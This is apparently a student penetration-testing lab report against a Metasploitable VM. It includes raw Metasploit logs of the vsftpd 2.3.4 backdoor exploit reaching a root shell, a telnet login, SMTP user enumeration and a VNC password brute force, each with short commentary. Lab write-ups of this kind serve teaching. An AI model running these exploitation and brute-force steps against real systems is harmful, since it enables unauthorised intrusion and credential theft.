#[1m#[34m[*]#[0m Spooling to file /home/kali/Desktop/exploit_results.txt...
#[4mmsf6#[0m #[0m> search vsftd##[Kpd 2.3.4
#[0m
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/#[45mvsftpd#[0m_234_backdoor  2011-07-03       #[32mexcellent#[0m  No     #[45mVSFTPD#[0m v#[45m2.3.4#[0m Backdoor Command Execution


Interact with a module by name or index. For example #[32minfo 0#[0m, #[32muse 0#[0m or #[32muse exploit/unix/ftp/vsftpd_234_backdoor#[0m

#[4mmsf6#[0m #[0m> use exploit ##[K/unis##[Kx/ftp/vsftpd##[Kd_234_backdoor
#[0m#[1m#[34m[*]#[0m No payload configured, defaulting to cmd/unix/interact
#[4mmsf6#[0m exploit(#[1m#[31munix/ftp/vsftpd_234_backdoor#[0m) #[0m> set RHOSTs##[KS 192.168.72.134
#[0mRHOSTS => 192.168.72.134
#[4mmsf6#[0m exploit(#[1m#[31munix/ftp/vsftpd_234_backdoor#[0m) #[0m> run
#[0m#[1m#[34m[*]#[0m 192.168.72.134:21 - Banner: 220 (vsFTPd 2.3.4)
#[1m#[34m[*]#[0m 192.168.72.134:21 - USER: 331 Please specify the password.
#[1m#[32m[+]#[0m 192.168.72.134:21 - Backdoor service has been spawned, handling...
#[1m#[32m[+]#[0m 192.168.72.134:21 - UID: uid=0(root) gid=0(root)
#[1m#[34m[*]#[0m Found shell.
#[1m#[34m[*]#[0m Command shell session 1 opened (192.168.72.129:45599 -> 192.168.72.134:6200) at 2025-01-29 10:00:10 +0000

#[0msh: line 6: session: command not found
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
ftp
msfadmin
service
user
Password_File
vulnerable
FTP_Password
Username: Admin
Password: pas$Word_#
#[H#[JFTP_Password
FTP_Password
Kali_exploit.txt
#[1m#[34m[*]#[0m 192.168.72.134 - Command shell session 1 closed.
#[4mmsf6#[0m exploit(#[1m#[31munix/ftp/vsftpd_234_backdoor#[0m) #[0m> exit
#[0m

The above results shows that the attacker was able to exploit the ftp service using “vsftpd_234_backdoor”. The attacker was able to create a session and view the files and directories of the user’s machine which is the metasploitable VM.

The files that were viewed are FTP_Password which can be seen in the directory named Password_File and inside of this FTP_Password file contains the username which is “Admin” and it’s password.

















 

                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started


metasploitable login: msfadmin
Password: 
Last login: Wed Jan 29 05:57:41 EST 2025 from 192.168.72.129 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ ls
Password_File  vulnerable
msfadmin@metasploitable:~$ cd vun# #lnerable
msfadmin@metasploitable:~/vulnerable$ ls
mysql-ssl  samba  tikiwiki  twiki20030201
msfadmin@metasploitable:~/vulnerable$ e# #exit
logout

The above results shows that the attacker was able to securely connect to the targets machine using “telnet” which has it’s port as 23. The attacker was able to view the files that are stored on the metasploitable machine.



















With the results below the attacker was able to exploit the SMTP server with it’s port as 25. It was able to view the username of the target machine which is “msfadmin”. This information can then be used to create a brute force attack by including a password list file.





#[1m#[34m[*]#[0m Spooling to file /home/kali/Desktop/exploit_results.txt...
#[4mmsf6#[0m #[0m> use##[K##[K##[Kuse auxiliary/scanner/smtp/smtp_enum
#[0m#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/smtp/smtp_enum#[0m) #[0m> set RHOSR##[KTS 192.168.72.134
#[0mRHOSTS => 192.168.72.134
#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/smtp/smtp_enum#[0m) #[0m> run
#[0m#[1m#[34m[*]#[0m 192.168.72.134:25     - 192.168.72.134:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
#[1m#[34m[*]#[0m 192.168.72.134:25     - Caught interrupt from the console...
#[1m#[34m[*]#[0m Auxiliary module execution completed
#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/smtp/smtp_enum#[0m) #[0m> clear
#[0m#[1m#[34m[*]#[0m exec: clear

#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/smtp/smtp_enum#[0m) #[0m> exit
#[0mStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... User_File.txt
Target count ............. 1
Username count ........... 10
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Jan 29 12:15:13 2025 #########
192.168.72.134: msfadmin exists
######## Scan completed at Wed Jan 29 12:15:14 2025 #########
1 results.

10 queries in 1 seconds (10.0 queries / sec)







The results below shows that the attacker was able to brute-force the VNC with it port being 5900. The brute-force attempt was successful and the password was seen to be “password1234”. Hint: This is a sample password provided and as such you can try using the original VNC password as this attack was performed in a controlled environment.





#[1m#[34m[*]#[0m Spooling to file /home/kali/Desktop/exploit_results.txt...
#[4mmsf6#[0m #[0m> use auxiliary/scanner/vnc/vnc_login
#[0m#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/vnc/vnc_login#[0m) #[0m> set RHOSTS 192.168.72.134
#[0mRHOSTS => 192.168.72.134
#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/vnc/vnc_login#[0m) #[0m> set PASS_File##[K##[K##[KILE /##[K/home/kali/Desktop/Password_File.txt#################SPassword_File.txt#################aPassword_File.txt#################mPassword_File.txt#################pPassword_File.txt#################lPassword_File.txt#################ePassword_File.txt#################_Password_File.txt#################
#[0mPASS_FILE => /home/kali/Desktop/Sample_Password_File.txt
#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/vnc/vnc_login#[0m) #[0m> run
#[0m#[1m#[34m[*]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - Starting VNC login sweep
#[1m#[33m[!]#[0m 192.168.72.134:5900   - No active DB -- Credential data will not be saved!
#[1m#[31m[-]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - LOGIN FAILED: :msfadmin (Incorrect: Authentication failed)
#[1m#[32m[+]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - Login Successful: :password1234
#[1m#[31m[-]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - LOGIN FAILED: :pass$w0rd (Incorrect: Authentication failed)
#[1m#[31m[-]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - LOGIN FAILED: :butler (Incorrect: Authentication failed)
#[1m#[31m[-]#[0m 192.168.72.134:5900   - 192.168.72.134:5900 - LOGIN FAILED: :mike@jdladfl (Incorrect: Authentication failed)
#[1m#[34m[*]#[0m 192.168.72.134:5900   - Scanned 1 of 1 hosts (100% complete)
#[1m#[34m[*]#[0m Auxiliary module execution completed
#[4mmsf6#[0m auxiliary(#[1m#[31mscanner/vnc/vnc_login#[0m) #[0m> exit
#[0m
